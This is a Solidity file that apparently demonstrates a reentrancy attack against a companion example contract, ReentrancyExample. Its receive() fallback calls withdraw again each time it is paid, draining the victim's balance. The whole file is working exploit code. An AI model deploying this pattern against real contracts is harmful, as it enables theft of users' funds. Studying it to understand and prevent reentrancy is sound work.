// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "./ReentrancyExample.sol"; 

contract AttackContract {
    address victim;

    constructor(address _victim) {
        victim = _victim; 
    }

    function deposit() external payable {
        ReentrancyExample(victim).deposit{value: msg.value}();
    }

    
    function withdraw(uint256 amount) external {
        ReentrancyExample(victim).withdraw(amount);
    }

    receive() external payable {
        uint256 amount = msg.value; 
        try ReentrancyExample(victim).withdraw(amount) {} catch {}
    }
}